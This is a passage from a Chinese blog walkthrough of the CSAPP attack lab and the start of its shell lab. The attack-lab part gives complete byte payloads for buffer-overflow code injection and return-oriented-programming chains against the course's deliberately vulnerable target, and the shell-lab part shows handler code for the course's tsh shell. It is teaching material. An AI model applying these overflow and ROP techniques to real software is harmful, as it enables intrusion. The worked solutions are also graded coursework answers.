class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">touch1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">vlevel = <span class="number">1</span>; <span class="comment">/* Part of validation protocol */</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Touch1!: You called touch1()\n&quot;</span>);</span><br><span class="line"><span class="built_in">validate</span>(<span class="number">1</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">getbuf</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> buf[BUFFER_SIZE];</span><br><span class="line"><span class="built_in">Gets</span>(buf);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>touch1函数的地址是<code>00000000004017c0</code>，这里要使用小端法写入程序，所以是<code>c017400000000000</code></p><p>test函数的反汇编</p><p><img src="https://i.loli.net/2021/02/13/rAPcQM47szVLR6X.png" alt="image-20210213184918397"></p><p>这个题的关键点在于覆盖getbuf函数的返回地址，可以看到getbuf的缓冲区大小为0x28</p><p><img src="https://i.loli.net/2021/02/13/l5UQRMDaersSO7A.png" alt="image-20210213185013392"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">c0 17 40 00</span><br><span class="line">00 00 00 00</span><br></pre></td></tr></table></figure><p>调用成功</p><p><img src="https://i.loli.net/2021/02/13/P857rftXoOv3JgC.png" alt="image-20210213190903671"></p><h3 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h3><p>这题要求执行touch2，并且传入参数（你的cookie）</p><p><img src="https://i.loli.net/2021/02/13/Vo83wklzHgfAu4Y.png" alt="image-20210213201612283"></p><figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">touch2</span><span class="params">(<span class="keyword">unsigned</span> val)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">vlevel = <span class="number">2</span>; <span class="comment">/* Part of validation protocol */</span></span><br><span class="line"><span class="keyword">if</span> (val == cookie) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Touch2!: You called touch2(0x%.8x)\n&quot;</span>, val);</span><br><span class="line"><span class="built_in">validate</span>(<span class="number">2</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Misfire: You called touch2(0x%.8x)\n&quot;</span>, val);</span><br><span class="line"><span class="built_in">fail</span>(<span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先找到touch2的地址<code>4017ec</code>，因为我们的cookie是<code>0x59b997fa</code>，所以传值为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 fa 97 b9 59</span><br><span class="line">68 ec 17 40 00</span><br><span class="line">c3</span><br><span class="line">00 00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 00</span><br><span class="line">78 dc 61 55 00 00 00 00</span><br></pre></td></tr></table></figure><p>成功</p><p><img src="https://i.loli.net/2021/02/13/wP8rWtgxem4DoUK.png" alt="image-20210213235902768"></p><p>然后解释一下前面那些奇怪的字符是什么意思(之所以使用ret到是因为限制了不能用jmp)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov 0x59b997fa, %rdi</span><br><span class="line">push 004017ec</span><br><span class="line">ret</span><br><span class="line">;最后一串是返回地址</span><br></pre></td></tr></table></figure><p>最后的返回地址是如何得到的:</p><p><img src="https://i.loli.net/2021/02/14/2pr8yb46U1oMzce.png" alt="image-20210214001024676"></p><h3 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h3><p><img src="https://i.loli.net/2021/02/19/oL5e3ucmpF7O12K.png" alt="image-20210219221214594"></p><figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Compare string to hex represention of unsigned value */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">hexmatch</span><span class="params">(<span class="keyword">unsigned</span> val, <span class="keyword">char</span> *sval)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> cbuf[<span class="number">110</span>];</span><br><span class="line"><span class="comment">/* Make position of check string unpredictable */</span></span><br><span class="line"><span class="keyword">char</span> *s = cbuf + <span class="built_in">random</span>() % <span class="number">100</span>;</span><br><span class="line"><span class="built_in">sprintf</span>(s, <span class="string">&quot;%.8x&quot;</span>, val);</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">strncmp</span>(sval, s, <span class="number">9</span>) == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">touch3</span><span class="params">(<span class="keyword">char</span> *sval)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">vlevel = <span class="number">3</span>; <span class="comment">/* Part of validation protocol */</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">hexmatch</span>(cookie, sval)) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Touch3!: You called touch3(\&quot;%s\&quot;)\n&quot;</span>, sval);</span><br><span class="line"><span class="built_in">validate</span>(<span class="number">3</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Misfire: You called touch3(\&quot;%s\&quot;)\n&quot;</span>, sval);</span><br><span class="line"><span class="built_in">fail</span>(<span class="number">3</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第三题让你传入的变成了cookie的地址，解决方式和第二题没有区别</p><p><img src="https://i.loli.net/2021/02/20/2np5BQzfFmtq9dW.png" alt="image-20210220014449554"></p><p>记得把cookie的值变成ascii码形式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">35 39 62 39 39 37 66 61 00</span><br><span class="line">48 c7 c7 78 dc 61 55</span><br><span class="line">68 fa 18 40 00</span><br><span class="line">c3</span><br><span class="line">00 00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 00</span><br><span class="line">81 dc 61 55 00 00 00 00</span><br></pre></td></tr></table></figure><p>第一行是cookie，第二行之后是汇编，最后一行是存着汇编的栈的返回地址。</p><p><img src="https://i.loli.net/2021/02/20/1v2QcSX4x5AKhRj.png" alt="image-20210220013408873"></p><h2 id="return-oriented-programming"><a href="#return-oriented-programming" class="headerlink" title="return-oriented programming"></a>return-oriented programming</h2><p>这两道题用了栈随机化（ASLR）和限制可执行代码区域（加入NX位，注入进栈中的代码无法被程序执行）</p><p><strong>ROP攻击就是利用函数自带的gadgets（就是现成的代码）构成一个攻击链，它借用代码段里面的多个retq前的一段指令拼凑成一段有效的逻辑，从而达到攻击的目标。为什么是retq呢，因为retq指令返回到哪里执行，由栈的内容决定，这是攻击者很容易控制的地方。</strong></p><p><img src="https://i.loli.net/2021/02/20/f1P2OGLspQgZndj.png" alt="image-20210220110756552"></p><h3 id="level2-1"><a href="#level2-1" class="headerlink" title="level2"></a>level2</h3><p>和上题一样，我们需要做的就是赋值%rdi为<code>0x59b997fa</code>，然后跳到touch2的地址。</p><p>因为gadgets不可能有<code>mov 0x59b997fa, %rdi</code>，所以我们把cookie的值存到栈中，然后pop到%rdi即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">5f    pop %rdi</span><br><span class="line">c3    retq</span><br></pre></td></tr></table></figure><p>然后找到对应的机器码，这个地址是40141b。</p><p><img src="https://i.loli.net/2021/02/20/w2hAudYptHo53E1.png" alt="image-20210220120258423"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 00 00</span><br><span class="line">1b 14 40 00 00 00 00 00</span><br><span class="line">fa 97 b9 59 00 00 00 00</span><br><span class="line">ec 17 40 00 00 00 00 00</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/02/20/M6jI1selTOvJimZ.png" alt="image-20210220122558444"></p><p>对照此图思考一下即可</p><p><img src="https://i.loli.net/2021/02/20/RSnVW7uvNrmwoyC.png" alt="image-20210220120705529"></p><h3 id="level3-1"><a href="#level3-1" class="headerlink" title="level3"></a>level3</h3><p>这道题也是同样的思路，不过因为栈随机化，所以不能直接用栈的地址。</p><p>首先把%rsp的地址传送到%rdi，然后获取字符串的偏移传送到%rsi，<code>lea (%rdi,%rsi,1), %rax</code>， 将字符串的首地址传送到%rax，再传送到%rdi，最后调用touch3</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#栈中的场景</span><br><span class="line">0x28の栈帧</span><br><span class="line">mov rsp, rax   --返回地址</span><br><span class="line">mov rax, rdi</span><br><span class="line">pop rax</span><br><span class="line">偏移0x48</span><br><span class="line">mov rax, rdx</span><br><span class="line">mov rdx, rcx</span><br><span class="line">mov rcx, rsi</span><br><span class="line">lea (rdi,rsi,1), rax</span><br><span class="line">mov rax, rdi</span><br><span class="line">touch3</span><br><span class="line">cookie</span><br></pre></td></tr></table></figure><p>要注意这全是拼出来的，rop主要的攻击方式就是拼，如果你想到了更好的方式，但是找不到机器码也是没用的。</p><p>首先把rsp的地址放到rax里</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">0000000000000000 &lt;.text&gt;:</span><br><span class="line">   0:   48 89 e0                mov    %rsp,%rax</span><br><span class="line">   3:   c3                      retq</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/02/20/fgm1RztLdJU4BCO.png" alt="image-20210220124307596"></p><p>然后把栈的地址放到rdi里</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">48 89 c7    mov %rax,%rdi</span><br><span class="line">c3          retq</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/02/20/gsvcxdtUiR1pylB.png" alt="image-20210220124606596"></p><p>以此类推，最后输入的数据如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 00 00</span><br><span class="line">06 1a 40 00 00 00 00 00 </span><br><span class="line">a2 19 40 00 00 00 00 00 </span><br><span class="line">cc 19 40 00 00 00 00 00 </span><br><span class="line">48 00 00 00 00 00 00 00 </span><br><span class="line">dd 19 40 00 00 00 00 00 </span><br><span class="line">70 1a 40 00 00 00 00 00 </span><br><span class="line">13 1a 40 00 00 00 00 00 </span><br><span class="line">d6 19 40 00 00 00 00 00 </span><br><span class="line">a2 19 40 00 00 00 00 00 </span><br><span class="line">fa 18 40 00 00 00 00 00 </span><br><span class="line">35 39 62 39 39 37 66 61 00</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/02/20/n9UTRH1XCb7KQmi.png" alt="image-20210220142055331"></p><h1 id="0x03-shell-lab"><a href="#0x03-shell-lab" class="headerlink" title="0x03 shell lab"></a>0x03 shell lab</h1><p>激动人心，终于可以开始写代码了。</p><p>如果shell lab不会写，就是因为书没仔细看。不过也没必要回去再看书，按照shell lab补充没细看的知识即可。</p><p>写之前看看：<a href="http://csapp.cs.cmu.edu/3e/shlab.pdf">http://csapp.cs.cmu.edu/3e/shlab.pdf</a></p><p>本实验需要实现一个unix shell，我们需要完善tsh.c的代码，写出7个函数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">• eval: 解析和解释命令行的主例程。 [70行]</span><br><span class="line">• builtin cmd: 识别并解释内置命令：quit，fg，bg和job。 [25行]</span><br><span class="line">• do bgfg: 实现bg和fg内置命令。 [50行]</span><br><span class="line">• waitfg: 等待前台作业的完成。[20行]</span><br><span class="line">• sigchld handler: 捕获SIGCHILD信号。80行]</span><br><span class="line">• sigint handler: 捕获SIGINT（ctrl-c）信号。[15行]</span><br><span class="line">• sigtstp handler: 捕获SIGTSTP（ctrl-z）信号。[15行]</span><br></pre></td></tr></table></figure><p>首先我们要知道的事情：</p><blockquote><ol><li>shell的第一个参数是内置命令的名称或可执行文件的路径。剩下的单词是命令行参数。</li><li>当是可执行文件路径名的时候，shell会开启一个子进程，然后在子进程的上下文中加载运行程序。</li><li>如果shell以&amp;结束，那么shell将在后台运行，这意味着shell在打印提示符和等待下一条命令行之前不会等待作业的终结。</li><li>最多只能有一个作业在前台运行。</li><li>tsh不需要支持管道符和重定向</li><li>ctrl+c（ctrl+z）会导致前台信号关闭</li><li>每个job都可以通过pid和jid（job id）来识别</li><li>tsh支持的内置指令：</li></ol><ul><li>quit：退出当前shell</li><li>jobs：列出所有后台job</li><li>bg&lt;job&gt;：通过发送SIGCONT信号重启&lt;job&gt;</li><li>fg&lt;job&gt;：通过发送SIGCONT信号重启&lt;job&gt;</li></ul></blockquote><p>在写之前建议先看看8.4.6的shell简易实现。</p><p>我们首先分析一下它给我们的main函数</p><figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> c;</span><br><span class="line">    <span class="keyword">char</span> cmdline[MAXLINE];</span><br><span class="line">    <span class="keyword">int</span> emit_prompt = <span class="number">1</span>; <span class="comment">/* 发出提示 (default) */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 将stderr重定向到stdout（这样，驱动程序将在连接到stdout的管道上获得所有输出） */</span></span><br><span class="line">    <span class="built_in">dup2</span>(<span class="number">1</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 解析命令行 */</span></span><br><span class="line">    <span class="keyword">while</span> ((c = <span class="built_in">getopt</span>(argc, argv, <span class="string">&quot;hvp&quot;</span>)) != EOF) &#123;</span><br><span class="line">        <span class="built_in"><span class="keyword">switch</span></span> (c) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;h&#x27;</span>:             <span class="comment">/* print help message */</span></span><br><span class="line">            <span class="built_in">usage</span>();</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;v&#x27;</span>:             <span class="comment">/* 发出额外的诊断信息 */</span></span><br><span class="line">            verbose = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;p&#x27;</span>:             <span class="comment">/* 不打印提示 */</span></span><br><span class="line">            emit_prompt = <span class="number">0</span>;  <span class="comment">/* 便于自动检测 */</span></span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">            <span class="built_in">usage</span>();</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 下面这三个信号需要我们自己实现 */</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">Signal</span>(SIGINT,  sigint_handler);   <span class="comment">/* ctrl-c 来自键盘的中断*/</span></span><br><span class="line">    <span class="built_in">Signal</span>(SIGTSTP, sigtstp_handler);  <span class="comment">/* ctrl-z 来自终端的中断*/</span></span><br><span class="line">    <span class="built_in">Signal</span>(SIGCHLD, sigchld_handler);  <span class="comment">/* 一个子进程停止或者终止 */</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">Signal</span>(SIGQUIT, sigquit_handler);  <span class="comment">/* 来自键盘的退出 */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 初始化job列表 */</span></span><br><span class="line">    <span class="built_in">initjobs</span>(jobs);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 执行shell循环 */</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 读取命令行列表 */</span></span><br><span class="line"><span class="keyword">if</span> (emit_prompt) &#123;                  <span class="comment">/* 是否输出提示 */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, prompt);</span><br><span class="line">    <span class="built_in">fflush</span>(stdout);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ((<span class="built_in">fgets</span>(cmdline, MAXLINE, stdin) == <span class="literal">NULL</span>) &amp;&amp; <span class="built_in">ferror</span>(stdin))</span><br><span class="line">    <span class="built_in">app_error</span>(<span class="string">&quot;fgets error&quot;</span>);       <span class="comment">/* 命令行读取为空 */</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">feof</span>(stdin)) &#123;                  <span class="comment">/* End of file (ctrl-d) */</span></span><br><span class="line">    <span class="built_in">fflush</span>(stdout);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Evaluate the command line */</span></span><br><span class="line"><span class="built_in">eval</span>(cmdline);</span><br><span class="line"><span class="built_in">fflush</span>(stdout);</span><br><span class="line"><span class="built_in">fflush</span>(stdout);</span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>); <span class="comment">/* control never reaches here */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后我们先把几个简单的信号写完</p><blockquote><p>首先是ctrl c终止前台作业</p></blockquote><figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sigint_handler</span><span class="params">(<span class="keyword">int</span> sig)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> olderrno = errno;<span class="comment">/* 见p536 G2 保存和恢复error */</span></span><br><span class="line">    <span class="keyword">sigset_t</span> mask_all, mask_prev;</span><br><span class="line">    <span class="keyword">pid_t</span> pid;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">sigfillset</span>(&amp;mask_all);<span class="comment">/* 见p536 G3 阻塞所有信号 */</span></span><br><span class="line">    <span class="built_in">sigprocmask</span>(SIG_BLOCK, &amp;mask_all, &amp;mask_prev);</span><br><span class="line">    pid = <span class="built_in">fgpid</span>(jobs);<span class="comment">/* 返回当前前台job的PID，如果没有此job，返回0 */</span></span><br><span class="line">    <span class="built_in">sigprocmask</span>(SIG_SETMASK, &amp;mask_prev, <span class="literal">NULL</span>); </span><br><span class="line">    <span class="keyword">if</span>(pid != <span class="number">0</span>)&#123;<span class="comment">/* 如果前台job存活，就kill掉 */</span></span><br><span class="line">        <span class="built_in">kill</span>(-pid, SIGINT);</span><br><span class="line">    &#125;</span><br><span class="line">    errno = olderrno;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>然后是ctrl z中断任务的执行，但该任务并没有结束，它只是在进程中维持挂起的状态</p><p>代码和上面的一样，改个信号就行</p></blockquote><figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sigtstp_handler</span><span class="params">(<span class="keyword">int</span> sig)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> olderrno = errno;<span class="comment">/* 见p536 G2 保存和恢复error */</span></span><br><span class="line">    <span class="keyword">sigset_t</span> mask_all, mask_prev;</span><br><span class="line">    <span class="keyword">pid_t</span> pid;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">sigfillset</span>(&amp;mask_all);<span class="comment">/* 见p536 G3 阻塞所有信号 */</span></span><br><span class="line">    <span class="built_in">sigprocmask</span>(SIG_BLOCK, &amp;mask_all, &amp;mask_prev);</span><br><span class="line">    pid = <span class="built_in">fgpid</span>(jobs);<span class="comment">/* 返回当前前台job的PID，如果没有此job，返回0 */</span></span><br><span class="line">    <span class="built_in">sigprocmask</span>(SIG_SETMASK, &amp;mask_prev, <span class="literal">NULL</span>); </span><br><span class="line">    <span class="keyword">if</span>(pid != <span class="number">0</span>)&#123;<span class="comment">/* 如果前台job存活，就kill掉 */</span></span><br><span class="line">        <span class="built_in">kill</span>(-pid, SIGTSTP);</span><br><span class="line">    &#125;</span><br><span class="line">    errno = olderrno;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>然后写waitfg</p></blockquote><figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">waitfg</span><span class="params">(<span class="keyword">pid_t</span> pid)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> <span class="keyword">while</span>(pid==<span class="built_in">fgpid</span>(jobs))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">sleep</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p> builtin cmd，这个书上有</p></blockquote><figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">builtin_cmd</span><span class="params">(<span class="keyword">char</span> **argv)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">&quot;quit&quot;</span>))</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">&quot;&amp;&quot;</span>))<span class="comment">/* 无视单独的&amp; */</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">&quot;bg&quot;</span>) || !<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">&quot;fg&quot;</span>))&#123;</span><br><span class="line">        <span class="built_in">do_bgfg</span>(argv);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;   </span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">&quot;jobs&quot;</span>)) &#123;<span class="comment">/* 查看当前有多少在后台运行的命令 */</span></span><br><span class="line">        <span class="built_in">listjobs</span>(jobs);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>接着实现do_bgfg</p></blockquote><figure class="highlight cc"><table><tr><td class="gutter"><pre><span 